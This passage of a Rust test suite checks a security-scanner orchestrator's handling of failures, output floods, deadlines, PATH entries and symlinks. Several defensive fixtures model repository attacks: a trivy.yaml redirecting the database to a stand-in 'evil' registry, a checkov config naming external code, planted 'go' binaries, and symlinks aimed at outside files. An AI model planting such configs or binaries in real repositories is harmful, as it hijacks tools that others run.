    let w = World::new(PROJECT);
    w.all_stubs();
    // Semgrep fails; gitleaks exits 0 without writing; osv-scanner's 1 means
    // "vulnerabilities found".
    w.stub_at(&w.bin.join("semgrep"), "semgrep", "semgrep", 7, "printf 'rule fetch failed\\n' >&2");
    write_executable(
        &w.bin.join("gitleaks"),
        "#!/bin/sh\ncase \"$1\" in version) printf 'v8.18.4\\n';; esac\nexit 0\n",
    );
    w.stub("osv-scanner", 1);
    // A stale report from an earlier run is never credited to this one.
    fs::create_dir_all(w.root.join(OUTPUT_DIR)).unwrap();
    fs::copy(fixture("gitleaks"), w.out("gitleaks.sarif")).unwrap();

    let report = w.scan(&Selection::All);
    assert_eq!(
        outcome(&report, "semgrep").outcome,
        Outcome::Failed { exit_code: Some(7), stderr: "rule fetch failed".to_string() }
    );
    let Outcome::Failed { exit_code, stderr } = &outcome(&report, "gitleaks").outcome else {
        panic!("{report:?}");
    };
    assert_eq!(*exit_code, Some(0));
    assert!(stderr.contains("wrote no SARIF"), "{stderr}");
    assert!(!Path::new(&w.out("gitleaks.sarif")).exists(), "the stale report was cleared");
    assert!(matches!(outcome(&report, "osv-scanner").outcome, Outcome::Ran { .. }));
    for name in ["trivy", "bandit", "gosec", "checkov", "codeql", "dependency-check"] {
        assert!(matches!(outcome(&report, name).outcome, Outcome::Ran { .. }), "{name} still ran");
    }
}

#[test]
fn captured_output_is_bounded_and_a_flooding_scanner_never_blocks() {
    let w = World::new(PROJECT);
    // 1 MiB on each stream, then a failure.
    let flood = "/bin/dd if=/dev/zero bs=1024 count=1024 2>/dev/null | /usr/bin/tr '\\0' 'x'";
    write_executable(
        &w.bin.join("bandit"),
        &format!(
            "#!/bin/sh\ncase \"$1\" in --version) printf 'bandit 1.7.10\\n'; exit 0;; esac\n\
             {flood}\n{flood} >&2\nprintf 'END' >&2\nexit 3\n"
        ),
    );
    let report = w.scan(&Selection::Only(strings(&["bandit"])));
    let Outcome::Failed { exit_code, stderr } = &outcome(&report, "bandit").outcome else {
        panic!("{report:?}");
    };
    assert_eq!(*exit_code, Some(3));
    assert!(stderr.len() <= crate::jobs::spawn::STDERR_CAP, "{} bytes kept", stderr.len());
    assert!(stderr.ends_with("END"), "the tail is kept");
    assert!(stderr.contains("bytes omitted"), "the cut is stated");
}

#[test]
fn a_relative_search_path_entry_never_resolves_a_binary() {
    let w = World::new(PROJECT);
    w.stub("semgrep", 0);
    // The same stub directory, spelled relative to this process's directory.
    let cwd = std::env::current_dir().unwrap();
    let up = "../".repeat(cwd.components().count() - 1);
    let relative = format!("{up}{}", w.bin.strip_prefix("/").unwrap().display());
    assert!(Path::new(&relative).join("semgrep").is_file(), "the relative entry does name the stub");
    let orchestrator =
        Orchestrator::open_with(&w.root, Some(&w.user), Some(OsString::from(relative))).unwrap();
    assert_eq!(orchestrator.detect()[0].detection, Detection::NotInstalled);
    assert!(w.invocations("semgrep").is_empty());
}

#[test]
fn an_unknown_scanner_in_a_selection_is_rejected_before_any_spawn() {
    let w = World::new(PROJECT);
    w.all_stubs();
    let err = w
        .open()
        .unwrap()
        .scan(&Selection::Only(strings(&["semgrep", "nmap"])))
        .expect_err("nmap is not registered");
    let config = err.downcast_ref::<ConfigError>().expect("a usage error");
    assert_eq!(config.exit_code(), 2);
    assert!(fs::read_dir(&w.rec).unwrap().next().is_none(), "nothing was spawned");
}

/// The path position is fixed: each scoped run's argv differs from the full
/// run's only there, by the path elements the scanner's slot takes at its
/// tested version (CRA-02, [FR-SC-17]); the whole-manifest scanners and CodeQL
/// have none, and ignore a scope.
///
/// [FR-SC-17]: ../../../docs/specs/requirements/FR-SC-17.md
#[test]
fn a_scoped_argv_differs_from_the_full_argv_only_by_its_path_elements() {
    let out = Path::new("/r/.logos/security/x.sarif");
    let extra = strings(&["--flag"]);
    let scope = [
        ScopedPath { rel: "app/db.py".to_string(), is_dir: false },
        ScopedPath { rel: "infra".to_string(), is_dir: true },
    ];
    // Per scanner, the path elements of each run, literally.
    let expected: &[(&str, &[&[&str]])] = &[
        ("semgrep", &[&["app/db.py", "infra"]]),
        ("gitleaks", &[&["--no-git", "--source", "app/db.py"], &["--no-git", "--source", "infra"]]),
        ("bandit", &[&["app/db.py", "infra"]]),
        ("gosec", &[&["./app", "./infra/..."]]),
        ("checkov", &[&["--file", "app/db.py"], &["--directory", "infra"]]),
    ];
    let path_capable: Vec<&str> = REGISTRY.iter().filter(|s| s.path_slot.is_some()).map(|s| s.name).collect();
    assert_eq!(path_capable, expected.iter().map(|(n, _)| *n).collect::<Vec<_>>());
    // Only Gitleaks' scoped run reads other evidence than its full scan (the
    // files, not their git history), so only its ingest keeps full-scan findings.
    let keeping: Vec<&str> =
        REGISTRY.iter().filter(|s| s.path_slot.is_some_and(|p| p.keeps_full_findings)).map(|s| s.name).collect();
    assert_eq!(keeping, ["gitleaks"]);
    for s in &REGISTRY {
        let fill = Fill {
            out,
            extra: &extra,
            scope: None,
            language: "python",
            database: Path::new("/db"),
            pinned_config: Path::new("/r/.logos/security/empty-config.yaml"),
            ignored: &[],
            targets: &Targets::Root,
            root: None,
            nvd_key_file: None,
            gitleaks_runs: false,
        };
        let full = s.render(s.run, &fill);
        let Some(slot) = s.path_slot else {
            assert!(!s.run.contains(&super::registry::Arg::Paths), "{} has no path position", s.name);
            assert_eq!(full, s.render(s.run, &Fill { scope: Some(&scope), ..fill }), "{} ignores a scope", s.name);
            continue;
        };
        let runs: Vec<Vec<OsString>> =
            slot.runs(&scope).into_iter().map(|run| s.render(s.run, &Fill { scope: Some(run), ..fill })).collect();
        // Every placeholder before the path position renders one element but
        // `Extra` (one per flag), `Ignored` (none here: nothing is ignored),
        // `SkipSecrets` (none here: Gitleaks does not run) and `Unignored`,
        // whose full-scan targets are the full scan's path elements (`.` here:
        // nothing is ignored) and which a scoped run leaves out.
        let before = &s.run[..s.run.iter().position(|a| *a == super::registry::Arg::Paths).unwrap()];
        let ignored = before.iter().filter(|a| matches!(a, super::registry::Arg::Ignored(_))).count();
        let unignored = before.iter().filter(|a| **a == super::registry::Arg::Unignored).count();
        let skipped = before.iter().filter(|a| **a == super::registry::Arg::SkipSecrets).count();
        let at = before.len() + extra.len() - 1 - ignored - skipped - unignored;
        let full_paths = if unignored > 0 { strings(&["."]) } else { strings(slot.full) };
        let (_, want_runs) = expected.iter().find(|(n, _)| *n == s.name).unwrap();
        assert_eq!(runs.len(), want_runs.len(), "{}: one run per slot group", s.name);
        for (scoped, want) in runs.iter().zip(want_runs.iter()) {
            // The full argv with its full-scan path elements swapped for these.
            let mut rebuilt: Vec<OsString> = full[..at].to_vec();
            rebuilt.extend(want.iter().map(OsString::from));
            rebuilt.extend(full[at + full_paths.len()..].iter().cloned());
            assert_eq!(*scoped, rebuilt, "{}: only the path elements differ", s.name);
            assert_eq!(full[at..at + full_paths.len()], full_paths.iter().map(OsString::from).collect::<Vec<_>>()[..]);
        }
    }
}

#[test]
fn the_version_is_the_first_version_shaped_token() {
    for (_, printed, want) in VERSIONS {
        assert_eq!(parse_version(printed).as_deref(), Some(*want), "{printed:?}");
    }
    assert_eq!(parse_version("no version here"), None);
    assert_eq!(parse_version("build 7"), None, "a lone integer is not a version");
}

/// A repository config that names code for the scanner to run stops that
/// scanner before it starts; the others run ([NFR-SE-02]).
///
/// [NFR-SE-02]: ../../../docs/specs/requirements/NFR-SE-02.md
#[test]
fn a_repository_scanner_config_that_can_name_code_to_run_refuses_that_scanner() {
    for file in [".checkov.yaml", ".checkov.yml"] {
        let w = World::new(PROJECT);
        w.all_stubs();
        fs::write(w.root.join(file), "external-checks-dir:\n  - checks\n").unwrap();
        let report = w.scan(&Selection::Only(strings(&["checkov", "bandit"])));
        let Outcome::Failed { exit_code, stderr } = &outcome(&report, "checkov").outcome else {
            panic!("{report:?}");
        };
        assert_eq!(*exit_code, None);
        assert!(stderr.starts_with(&format!("not run: the repository's {file}")), "{stderr}");
        assert!(w.runs("checkov").is_empty(), "{file}: checkov was never started on the repository");
        assert_eq!(outcome(&report, "checkov").coverage, None, "{file}: a refused scanner states no coverage");
        assert!(matches!(outcome(&report, "bandit").outcome, Outcome::Ran { .. }));
        assert_eq!(outcome(&report, "bandit").coverage, Some(Coverage::EXCLUDED), "{file}: one that ran does");
    }
}

/// Trivy is pointed at an empty config Logos writes, so a committed
/// `trivy.yaml` is never read, and a symlink in the pinned file's place is
/// replaced, never written through.
#[test]
fn trivy_reads_a_pinned_empty_config_never_the_repositorys() {
    let w = World::new(&[("trivy.yaml", "db:\n  repository: registry.example/evil\n")]);
    w.stub("trivy", 0);
    let outside = w.user.join("victim.txt");
    fs::write(&outside, "keep me").unwrap();
    let out_dir = w.root.join(OUTPUT_DIR);
    fs::create_dir_all(&out_dir).unwrap();
    std::os::unix::fs::symlink(&outside, out_dir.join("empty-config.yaml")).unwrap();

    let report = w.scan(&Selection::Only(strings(&["trivy"])));
    assert!(matches!(outcome(&report, "trivy").outcome, Outcome::Ran { .. }), "{report:?}");
    let run = &w.runs("trivy")[0];
    let at = run.iter().position(|a| a == "--config").expect("--config is pinned");
    assert_eq!(run[at + 1], w.out("empty-config.yaml"));
    assert!(!run.iter().any(|a| a.contains("trivy.yaml")), "{run:?}");
    let pinned = out_dir.join("empty-config.yaml");
    assert!(!fs::symlink_metadata(&pinned).unwrap().file_type().is_symlink());
    assert_eq!(fs::read_to_string(&pinned).unwrap(), "");
    assert_eq!(fs::read_to_string(&outside).unwrap(), "keep me", "the link target is untouched");
}

#[test]
fn a_symlinked_output_directory_is_refused_before_any_spawn() {
    let w = World::new(PROJECT);
    w.all_stubs();
    let elsewhere = w.user.join("elsewhere");
    fs::create_dir_all(&elsewhere).unwrap();
    fs::create_dir_all(w.root.join(".logos")).unwrap();
    std::os::unix::fs::symlink(&elsewhere, w.root.join(OUTPUT_DIR)).unwrap();
    let err = w.open().unwrap().scan(&Selection::All).expect_err("refused");
    assert!(err.to_string().contains("symbolic link"), "{err:#}");
    assert!(fs::read_dir(&w.rec).unwrap().next().is_none(), "nothing was spawned");
    assert!(fs::read_dir(&elsewhere).unwrap().next().is_none(), "nothing was written there");
}

/// A directory output whose place holds a symlink is recreated as a real
/// directory, so the scanner never writes through the link.
#[test]
fn a_symlink_in_a_directory_outputs_place_is_replaced_not_followed() {
    let w = World::new(PROJECT);
    w.stub("checkov", 0);
    let elsewhere = w.user.join("elsewhere");
    fs::create_dir_all(&elsewhere).unwrap();
    let out_dir = w.root.join(OUTPUT_DIR);
    fs::create_dir_all(&out_dir).unwrap();
    // The link target holds a file named like the report the stale-clear
    // removes: it must survive, so nothing is deleted through the link either.
    fs::write(elsewhere.join("results_sarif.sarif"), "precious").unwrap();
    std::os::unix::fs::symlink(&elsewhere, out_dir.join("checkov")).unwrap();
    let report = w.scan(&Selection::Only(strings(&["checkov"])));
    assert!(matches!(outcome(&report, "checkov").outcome, Outcome::Ran { .. }), "{report:?}");
    assert!(!fs::symlink_metadata(out_dir.join("checkov")).unwrap().file_type().is_symlink());
    let left: Vec<_> = fs::read_dir(&elsewhere).unwrap().map(|e| e.unwrap().file_name()).collect();
    assert_eq!(left, ["results_sarif.sarif"], "nothing was written or deleted there");
    assert_eq!(fs::read_to_string(elsewhere.join("results_sarif.sarif")).unwrap(), "precious");
}

/// The stub's recorded `cwd=`, `path=` or `lgtm=` lines for `name`.
fn recorded(w: &World, name: &str, key: &str) -> Vec<String> {
    fs::read_to_string(w.rec.join(format!("{name}.env")))
        .unwrap_or_default()
        .lines()
        .filter_map(|l| l.strip_prefix(&format!("{key}=")).map(str::to_string))
        .collect()
}

/// Every spawn — probe and run, both CodeQL steps — runs in the project root,
/// which every template spells `.`.
#[test]
fn every_scanner_process_runs_in_the_project_root() {
    let w = World::new(PROJECT);
    w.all_stubs();
    w.scan(&Selection::All);
    let root = w.root.canonicalize().unwrap().display().to_string();
    for s in &REGISTRY {
        let cwds = recorded(&w, s.name, "cwd");
        let calls = w.invocations(s.name).len();
        assert_eq!(cwds.len(), calls, "{}: one cwd per call", s.name);
        assert!(cwds.iter().all(|c| *c == root), "{}: {cwds:?}", s.name);
    }
}

/// The scanner's own `PATH` holds only the absolute entries outside the root,
/// so a tool it starts by name is never one the repository committed.
#[test]
fn a_scanner_never_resolves_a_tool_from_the_repository() {
    let w = World::new(PROJECT);
    let marker = w.user.join("repo-go-ran");
    let planted = format!("#!/bin/sh\n: > '{}'\n", marker.display());
    for dir in ["", "tools", "bin"] {
        fs::create_dir_all(w.root.join(dir)).unwrap();
        write_executable(&w.root.join(dir).join("go"), &planted);
    }
    // gosec starts `go` by name, as the real one does.
    w.stub_at(&w.bin.join("gosec"), "gosec", "gosec", 0, "go list ./... 2>/dev/null");
    let search = std::env::join_paths([
        w.bin.clone(),
        PathBuf::from("tools"),
        PathBuf::from(""),
        w.root.join("bin"),
    ])
    .unwrap();
    let orchestrator = Orchestrator::open_with(&w.root, Some(&w.user), Some(search)).unwrap();
    let report = orchestrator.scan(&Selection::Only(strings(&["gosec"]))).unwrap();
    assert!(matches!(outcome(&report, "gosec").outcome, Outcome::Ran { .. }), "{report:?}");
    assert!(!marker.exists(), "a repository-committed `go` ran");
    let paths = recorded(&w, "gosec", "path");
    assert!(!paths.is_empty());
    assert!(paths.iter().all(|p| *p == w.bin.display().to_string()), "{paths:?}");
}

/// An absolute `PATH` entry inside the project (an activated in-repo virtualenv,
/// a direnv `PATH_add bin`) is not searched for the scanner either.
#[test]
fn an_absolute_search_path_entry_inside_the_project_is_not_searched() {
    let w = World::new(PROJECT);
    let inside = w.root.join("node_modules/.bin");
    fs::create_dir_all(&inside).unwrap();
    w.stub_at(&inside.join("semgrep"), "semgrep", "semgrep", 0, "");
    let orchestrator =
        Orchestrator::open_with(&w.root, Some(&w.user), Some(inside.into_os_string())).unwrap();
    assert_eq!(orchestrator.detect()[0].detection, Detection::NotInstalled);
    assert!(w.invocations("semgrep").is_empty());
}

#[test]
fn a_symlinked_logos_directory_is_refused_before_any_spawn() {
    let w = World::new(PROJECT);
    w.all_stubs();
    let elsewhere = w.user.join("elsewhere");
    fs::create_dir_all(&elsewhere).unwrap();
    std::os::unix::fs::symlink(&elsewhere, w.root.join(".logos")).unwrap();
    let err = w.open().unwrap().scan(&Selection::All).expect_err("refused");
    assert!(err.to_string().contains("symbolic link"), "{err:#}");
    assert!(fs::read_dir(&w.rec).unwrap().next().is_none(), "nothing was spawned");
    assert!(fs::read_dir(&elsewhere).unwrap().next().is_none(), "nothing was written there");
}

/// A symlink in place of CodeQL's database directory, or of one language's
/// database, is replaced; the database is created inside the project.
#[test]
fn codeql_databases_are_never_written_through_a_symlink() {
    for linked in ["codeql", "codeql/python"] {
        let w = World::new(&[("app/db.py", "")]);
        w.stub("codeql", 0);
        let elsewhere = w.user.join("elsewhere");
        fs::create_dir_all(&elsewhere).unwrap();
        let out_dir = w.root.join(OUTPUT_DIR);
        fs::create_dir_all(out_dir.join("codeql")).unwrap();
        if linked == "codeql" {
            fs::remove_dir(out_dir.join("codeql")).unwrap();
        }
        std::os::unix::fs::symlink(&elsewhere, out_dir.join(linked)).unwrap();
        let report = w.scan(&Selection::Only(strings(&["codeql"])));
        assert!(matches!(outcome(&report, "codeql").outcome, Outcome::Ran { .. }), "{report:?}");
        assert!(!is_link(&out_dir.join(linked)), "{linked} is no longer a link");
        let database = &w.runs("codeql")[0][2];
        assert_eq!(*database, out_dir.join("codeql/python").display().to_string());
        assert!(fs::read_dir(&elsewhere).unwrap().next().is_none(), "{linked}: nothing written there");
    }
}

fn is_link(path: &Path) -> bool {
    fs::symlink_metadata(path).is_ok_and(|m| m.file_type().is_symlink())
}

/// The language walk reads the project alone: `.logos` and `.git` are never
/// counted, a git-ignored file is not a language, and a hidden directory is.
#[test]
fn codeql_counts_the_projects_own_unignored_sources() {
    let w = World::new(&[
        (".logos/cache/x.py", ""),
        (".git/hooks/x.rb", ""),
        ("vendor/lib.js", ""),
        (".gitignore", "vendor/\n"),
    ]);
    w.stub("codeql", 0);
    let report = w.scan(&Selection::Only(strings(&["codeql"])));
    assert!(matches!(outcome(&report, "codeql").outcome, Outcome::NotApplicable { .. }), "{report:?}");

    let w = World::new(&[(".github/scripts/check.py", "")]);
    w.stub("codeql", 0);
    let report = w.scan(&Selection::Only(strings(&["codeql"])));
    let Outcome::Ran { sarif, .. } = &outcome(&report, "codeql").outcome else { panic!("{report:?}") };
    assert_eq!(*sarif, vec![PathBuf::from(w.out("codeql.sarif"))]);
}

/// A stale report is cleared for every output shape — a directory output and
/// a CodeQL language report too — so a scanner that writes nothing fails.
#[test]
fn a_stale_report_is_never_credited_whatever_the_output_shape() {
    let w = World::new(&[("app/db.py", "")]);
    let quiet = |name: &str, version: &str| {
        write_executable(
            &w.bin.join(name),
            &format!("#!/bin/sh\ncase \"$1\" in --version|version) printf '{version}\\n';; esac\nexit 0\n"),
        );
    };
    quiet("checkov", "3.2.255");
    quiet("codeql", "2.19.3");
    let out_dir = w.root.join(OUTPUT_DIR);
    fs::create_dir_all(out_dir.join("checkov")).unwrap();
    fs::copy(fixture("checkov"), out_dir.join("checkov/results_sarif.sarif")).unwrap();
    fs::create_dir_all(out_dir.join("codeql")).unwrap();
    fs::copy(fixture("codeql"), out_dir.join("codeql/python.sarif")).unwrap();
    fs::copy(fixture("codeql"), out_dir.join("codeql.sarif")).unwrap();
    let report = w.scan(&Selection::Only(strings(&["checkov", "codeql"])));
    for name in ["checkov", "codeql"] {
        let Outcome::Failed { exit_code, stderr } = &outcome(&report, name).outcome else {
            panic!("{name}: {report:?}");
        };
        assert_eq!(*exit_code, Some(0), "{name}");
        assert!(stderr.contains("wrote no SARIF"), "{name}: {stderr}");
    }
}

/// A report Logos cannot clear (a directory in its place) fails that scanner
/// before it starts.
#[test]
fn a_report_that_cannot_be_cleared_fails_before_the_scanner_starts() {
    let w = World::new(PROJECT);
    w.stub("semgrep", 0);
    fs::create_dir_all(w.root.join(OUTPUT_DIR).join("semgrep.sarif/inner")).unwrap();
    let report = w.scan(&Selection::Only(strings(&["semgrep"])));
    let Outcome::Failed { exit_code, stderr } = &outcome(&report, "semgrep").outcome else {
        panic!("{report:?}");
    };
    assert_eq!(*exit_code, None);
    assert!(stderr.starts_with("could not clear the previous report"), "{stderr}");
    assert!(w.runs("semgrep").is_empty(), "the scanner was not started");
}

/// The failure reports the scanner's real exit code — also one its template
/// accepts — and falls back to stdout when stderr is empty.
#[test]
fn a_failure_carries_the_real_exit_code_and_the_output_that_explains_it() {
    let w = World::new(PROJECT);
    // osv-scanner exits 1 ("vulnerabilities found"), accepted, but writes nothing.
    write_executable(
        &w.bin.join("osv-scanner"),
        "#!/bin/sh\ncase \"$1\" in --version) printf '1.9.1\\n'; exit 0;; esac\nexit 1\n",
    );
    // bandit explains its failure on stdout only.
    write_executable(
        &w.bin.join("bandit"),
        "#!/bin/sh\ncase \"$1\" in --version) printf 'bandit 1.7.10\\n'; exit 0;; esac\nprintf 'sarif formatter missing\\n'\nexit 2\n",
    );
    let report = w.scan(&Selection::Only(strings(&["osv-scanner", "bandit"])));
    let Outcome::Failed { exit_code, stderr } = &outcome(&report, "osv-scanner").outcome else {
        panic!("{report:?}");
    };
    assert_eq!(*exit_code, Some(1));
    assert!(stderr.contains("exited with 1"), "{stderr}");
    assert_eq!(
        outcome(&report, "bandit").outcome,
        Outcome::Failed { exit_code: Some(2), stderr: "sarif formatter missing".to_string() }
    );
}

#[test]
fn a_scanner_that_cannot_be_started_fails_with_the_reason() {
    let w = World::new(PROJECT);
    write_executable(&w.bin.join("semgrep"), "#!/nonexistent/interpreter\n");
    let report = w.scan(&Selection::Only(strings(&["semgrep"])));
    let o = outcome(&report, "semgrep");
    assert_eq!(o.version, None, "the probe could not start either");
    let Outcome::Failed { exit_code, stderr } = &o.outcome else { panic!("{report:?}") };
    assert_eq!(*exit_code, None);
    assert!(stderr.starts_with("could not start "), "{stderr}");
}

/// A scan reports an absent scanner as not installed, and runs the selected
/// scanners once each, in registry order, whatever the selection's order.
#[test]
fn a_scan_reports_every_selected_scanner_once_in_registry_order() {
    let w = World::new(PROJECT);
    w.stub("gosec", 0);
    let report = w.scan(&Selection::All);
    for o in &report.outcomes {
        if o.scanner != "gosec" {
            assert_eq!((&o.outcome, &o.version), (&Outcome::NotInstalled, &None), "{}", o.scanner);
        }
    }
    let w = World::new(PROJECT);
    w.all_stubs();
    let report = w.scan(&Selection::Only(strings(&["gosec", "semgrep", "gosec"])));
    let names: Vec<&str> = report.outcomes.iter().map(|o| o.scanner).collect();
    assert_eq!(names, ["semgrep", "gosec"]);
    assert_eq!(w.runs("gosec").len(), 1);
}

/// A version probe that fails yields no version, even if it printed one; a
/// version printed on stderr only is read.
#[test]
fn the_version_comes_from_a_successful_probe_on_either_stream() {
    let w = World::new(PROJECT);
    write_executable(&w.bin.join("semgrep"), "#!/bin/sh\nprintf '1.85.0\\n'\nexit 2\n");
    write_executable(&w.bin.join("trivy"), "#!/bin/sh\nprintf 'Version: 0.74.0\\n' >&2\nexit 0\n");
    let states = w.open().unwrap().detect();
    assert_eq!(states[0].detection, Detection::Installed { binary: w.bin.join("semgrep"), version: None, copy: CopyKind::Path });
    assert_eq!(
        states[1].detection,
        Detection::Installed {
            binary: w.bin.join("trivy"),
            version: Some("0.74.0".to_string()),
            copy: CopyKind::Path,
        }
    );
}

/// Only an executable regular file is a scanner; every binary name is looked
/// up; the first search-path entry that has one wins.
#[test]
fn a_scanner_is_the_first_executable_file_under_any_of_its_names() {
    let w = World::new(PROJECT);
    fs::write(w.bin.join("semgrep"), "#!/bin/sh\n").unwrap(); // mode 0644
    fs::create_dir_all(w.bin.join("trivy")).unwrap();
    w.stub_at(&w.bin.join("dependency-check.sh"), "dependency-check", "dependency-check", 0, "");
    let second = w.user.join("second");
    fs::create_dir_all(&second).unwrap();
    w.stub_at(&second.join("gosec"), "gosec", "gosec-second", 0, "");
    w.stub("gosec", 0);
    let search = std::env::join_paths([w.bin.clone(), second]).unwrap();
    let states = Orchestrator::open_with(&w.root, Some(&w.user), Some(search)).unwrap().detect();
    let state = |name: &str| &states.iter().find(|s| s.scanner == name).unwrap().detection;
    assert_eq!(*state("semgrep"), Detection::NotInstalled, "not executable");
    assert_eq!(*state("trivy"), Detection::NotInstalled, "a directory");
    assert!(
        matches!(state("dependency-check"), Detection::Installed { binary, .. } if binary.ends_with("dependency-check.sh")),
        "{:?}",
        state("dependency-check")
    );
    assert!(
        matches!(state("gosec"), Detection::Installed { binary, .. } if *binary == w.bin.join("gosec")),
        "{:?}",
        state("gosec")
    );
    assert!(w.invocations("gosec-second").is_empty());
}

/// A deadline kills the whole process group — a grandchild holding the pipes
/// included — and a scanner that exits leaves nothing behind that could hold
/// the run open.
#[test]
fn a_deadline_and_an_exit_end_the_whole_process_group() {
    use crate::jobs::spawn::{run, Launch};
    use std::time::{Duration, Instant};
    let w = World::new(PROJECT);
    let script = |name: &str, body: &str| {
        let p = w.bin.join(name);
        write_executable(&p, &format!("#!/bin/sh\n{body}\n"));
        p
    };
    let launch = |deadline| Launch { cwd: &w.root, env: &[], vars: &[], isolated: None, path: None, deadline };

    let hang = script("hang", "/bin/sleep 30 & /bin/sleep 30");
    let start = Instant::now();
    let f = run(&hang, &[], &launch(Some(Duration::from_millis(300)))).unwrap();
    assert_eq!(f.status, None, "killed at the deadline");
    assert!(
        start.elapsed() < crate::perf::scaled(Duration::from_secs(10)),
        "{:?}",
        start.elapsed()
    );

    // A process the scanner left running is killed with it: its marker, due
    // two seconds later, never appears.
    let marker = w.user.join("leftover-ran");
    let leave = script(
        "leave",
        &format!("(/bin/sleep 2; : > '{}') &\nprintf 'done\\n'\nexit 0", marker.display()),
    );
    let start = Instant::now();
    let f = run(&leave, &[], &launch(None)).unwrap();
    assert!(f.status.is_some_and(|s| s.success()));
    assert_eq!(f.stdout, "done\n");
    assert!(
        start.elapsed() < crate::perf::scaled(Duration::from_secs(10)),
        "{:?}",
        start.elapsed()
    );
    std::thread::sleep(Duration::from_secs(3));
    assert!(!marker.exists(), "the leftover process outlived the scanner");

    // Stdout keeps its head and its tail, within the cap (HF-8).
    let flood = script("flood", "printf 'HEAD'; /bin/dd if=/dev/zero bs=1024 count=1024 2>/dev/null | /usr/bin/tr '\\0' 'x'; printf 'TAIL'");
    let f = run(&flood, &[], &launch(None)).unwrap();
    assert!(f.stdout.len() <= crate::jobs::spawn::STDOUT_CAP, "{} bytes kept", f.stdout.len());
    assert!(f.stdout.starts_with("HEAD") && f.stdout.ends_with("TAIL"), "head and tail kept");
    assert!(f.stdout.contains("bytes omitted"), "the cut is stated");
}

#[test]
fn a_scanner_table_without_enabled_is_enabled_and_an_unreadable_user_config_fails() {
    let cfg = parse_config("[security_scan.dependency-check]\n", Path::new("config.toml")).unwrap();
    assert!(cfg.security_scan.is_enabled("dependency-check"));

    let w = World::new(PROJECT);
    fs::create_dir_all(w.user.join("config.toml")).unwrap();
    let err = w.open().expect_err("a user config that cannot be read fails the load");
    assert!(matches!(err, ConfigError::Io { .. }), "{err}");
    assert_eq!(err.exit_code(), 2);
}

/// A scoped run of a scanner with a directory output (Checkov) makes one run
/// per path in `scoped/`, each into its own directory, and merges what they
/// produced into `scoped/checkov.sarif`; the whole-project report is never
/// touched ([FR-SC-17]).
///
/// [FR-SC-17]: ../../../docs/specs/requirements/FR-SC-17.md
#[test]
fn a_scoped_directory_output_scanner_runs_per_path_and_merges_into_one_report() {
    let w = World::new(PROJECT);
    w.stub("checkov", 0);
    let scope = super::resolve_scope(&w.root, &strings(&["infra/main.tf", "app"])).unwrap();
    let report = w.open().unwrap().scan_in(&Selection::Only(strings(&["checkov"])), Some(&scope)).unwrap();
    let scoped = |p: &str| w.root.join(OUTPUT_DIR).join("scoped").join(p).display().to_string();
    let Outcome::Ran { sarif, .. } = &outcome(&report, "checkov").outcome else {
        panic!("checkov ran: {report:?}");
    };
    assert_eq!(sarif, &[PathBuf::from(scoped("checkov.sarif"))]);
    let runs = w.runs("checkov");
    let tails: Vec<&[String]> = runs.iter().map(|r| &r[r.len() - 4..]).collect();
    assert_eq!(
        tails,
        [
            &strings(&["--skip-path", ".logos", "--file", "infra/main.tf"])[..],
            &strings(&["--skip-path", ".logos", "--directory", "app"])[..],
        ]
    );
    for (run, n) in runs.iter().zip(1..) {
        let at = run.iter().position(|a| a == "--output-file-path").unwrap();
        assert_eq!(run[at + 1], scoped(&format!("checkov.{n}")), "each run writes its own directory");
    }
    let merged: serde_json::Value = serde_json::from_slice(&fs::read(scoped("checkov.sarif")).unwrap()).unwrap();
    assert_eq!(merged["runs"].as_array().unwrap().len(), 2);
    assert!(!Path::new(&w.out("checkov.sarif")).exists(), "no whole-project report was written");
}

/// Each Checkov run's argv from `--soft-fail` on: where the secrets skip sits,
/// and everything the template fixes after it.
fn checkov_tails(w: &World) -> Vec<Vec<String>> {
    w.runs("checkov")
        .iter()
        .map(|run| {
            let at = run.iter().position(|a| a == "--soft-fail").expect("a Checkov run carries --soft-fail");
            run[at..].to_vec()
        })
        .collect()
}

/// S-813: with Gitleaks enabled and installed, Checkov is told to skip its
/// `secrets` framework — whichever scanners the call selects — and with
/// Gitleaks absent or disabled its argv is the template's alone.
#[test]
fn checkov_skips_its_secrets_framework_only_while_gitleaks_runs() {
    let skip = strings(&["--soft-fail", "--quiet", "--skip-framework", "secrets", "--skip-path", ".logos", "--directory", "."]);
    let plain = strings(&["--soft-fail", "--quiet", "--skip-path", ".logos", "--directory", "."]);
    let checkov_alone = Selection::Only(strings(&["checkov"]));

    // Installed and enabled: the flag, with Checkov selected on its own.
    let w = World::new(PROJECT);
    w.stub("checkov", 0);
    w.stub("gitleaks", 0);
    w.scan(&checkov_alone);
    assert_eq!(checkov_tails(&w), std::slice::from_ref(&skip));
    assert!(w.runs("gitleaks").is_empty(), "Gitleaks was only consulted, never run");

    // Not installed: unchanged.
    let w = World::new(PROJECT);
    w.stub("checkov", 0);
    w.scan(&checkov_alone);
    assert_eq!(checkov_tails(&w), std::slice::from_ref(&plain), "gitleaks not installed");

    // Installed but disabled by the repository's config (the only place a
    // scanner is switched off): unchanged.
    let w = World::new(PROJECT);
    w.stub("checkov", 0);
    w.stub("gitleaks", 0);
    w.repo_config("[security_scan.gitleaks]\nenabled = false\n");
    w.scan(&checkov_alone);
    assert_eq!(checkov_tails(&w), std::slice::from_ref(&plain), "gitleaks disabled");

    // A user-level `path` is the only copy considered, as the run itself reads
    // it: an executable one off the search path counts, and a missing one does
    // not even with a copy on the search path.
    let w = World::new(PROJECT);
    w.stub("checkov", 0);
    let custom = w.user.join("tools").join("gitleaks-pinned");
    fs::create_dir_all(custom.parent().unwrap()).unwrap();
    w.stub_at(&custom, "gitleaks", "gitleaks-pinned", 0, "");
    w.user_config(&format!("[security_scan.gitleaks]\npath = \"{}\"\n", custom.display()));
    w.scan(&checkov_alone);
    assert_eq!(checkov_tails(&w), [skip], "an executable gitleaks path off the search path");
    let w = World::new(PROJECT);
    w.stub("checkov", 0);
    w.stub("gitleaks", 0);
    w.user_config(&format!("[security_scan.gitleaks]\npath = \"{}\"\n", w.user.join("missing").display()));
    w.scan(&checkov_alone);
    assert_eq!(checkov_tails(&w), std::slice::from_ref(&plain), "a gitleaks path that is no executable");

    // Near misses: another scanner installed leaves the argv alone.
    let w = World::new(PROJECT);
    w.stub("checkov", 0);
    w.stub("trivy", 0);
    w.scan(&checkov_alone);
    assert_eq!(checkov_tails(&w), [plain], "only trivy installed");
}

/// S-813: a scoped run ([FR-SC-17]) follows the same rule — each per-path
/// Checkov run carries the flag before its `--skip-path`, and none does
/// without Gitleaks.
///
/// [FR-SC-17]: ../../../docs/specs/requirements/FR-SC-17.md
#[test]
